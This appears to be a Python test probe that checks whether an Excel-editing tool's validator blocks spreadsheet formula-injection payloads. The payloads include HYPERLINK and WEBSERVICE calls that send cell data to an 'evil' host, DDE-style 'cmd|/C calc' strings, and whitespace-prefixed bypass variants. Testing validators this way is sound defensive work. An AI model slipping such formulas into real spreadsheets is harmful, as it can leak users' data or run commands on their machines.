import sys, importlib.util, shutil, tempfile
from pathlib import Path
tmp = Path(tempfile.mkdtemp(prefix="probe-"))
src = (Path(__file__).resolve().parents[3] / "src" / "backend" / "tools" / "excel_edit.py").read_text(encoding="utf-8")
kept = [l for l in src.splitlines(keepends=True) if "langchain_core" not in l and "from ._files" not in l]
(tmp / "_files.py").write_text("class FileAccessError(Exception): pass\ndef resolve_safe_path(*a,**k): raise NotImplementedError\n", encoding="utf-8")
(tmp / "probe_ee.py").write_text("".join(kept), encoding="utf-8")
sys.path.insert(0, str(tmp))
spec = importlib.util.spec_from_file_location("probe_ee", tmp / "probe_ee.py")
mod = importlib.util.module_from_spec(spec); sys.modules["probe_ee"] = mod; spec.loader.exec_module(mod)

vals = [
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")", "+SUM(1,1)", "-SUM(1,1)", "@SUM(1,1)",
    "\t=SUM(1,1)", "\n=SUM(1,1)", "\r=SUM(1,1)", "  =SUM(1,1)", " =SUM(1,1)", " =SUM(1,1)",
    "|cmd| /C calc", "cmd| /C calc", "plain",
]
print("=== excel_edit.set_cell (sheet required) ===")
for v in vals:
    try:
        mod.ExcelEditOperation(action="set_cell", sheet="S", cell="A1", value=v)
        print("  ALLOWED", repr(v))
    except Exception as exc:
        msg = [l for l in str(exc).splitlines() if "Value error" in l]
        print("  BLOCKED", repr(v), "->", msg[0].split("Value error,")[-1].strip() if msg else str(exc)[:60])

print("=== excel_edit.set_formula ===")
for f in ["=cmd|'/c calc'!A1", "=WEBSERVICE(\"http://evil/x\")", "=WEBAPI(\"http://evil/x\")",
          "=IMPORTXML(\"http://e/x\",\"//x\")", "=FILTERXML(\"http://e/x\",\"//x\")",
          "=DDE(\"srv\",\"t\",\"c\")", "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
          "\t=SUM(1,1)", "=SUM(1,1)", "|cmd| /C calc"]:
    try:
        mod.ExcelEditOperation(action="set_formula", sheet="S", cell="A1", formula=f)
        print("  ALLOWED", repr(f))
    except Exception as exc:
        msg = [l for l in str(exc).splitlines() if "Value error" in l]
        print("  BLOCKED", repr(f), "->", msg[0].split("Value error,")[-1].strip() if msg else str(exc)[:60])

print("=== excel_edit.set_number_format ===")
for f in ["#,##0.00", "|cmd| /C calc", "=HYPERLINK(\"http://e/\")", "0\t0"]:
    try:
        mod.ExcelEditOperation(action="set_number_format", sheet="S", column_index=1, number_format=f)
        print("  ALLOWED", repr(f))
    except Exception as exc:
        msg = [l for l in str(exc).splitlines() if "Value error" in l]
        print("  BLOCKED", repr(f), "->", msg[0].split("Value error,")[-1].strip() if msg else str(exc)[:60])
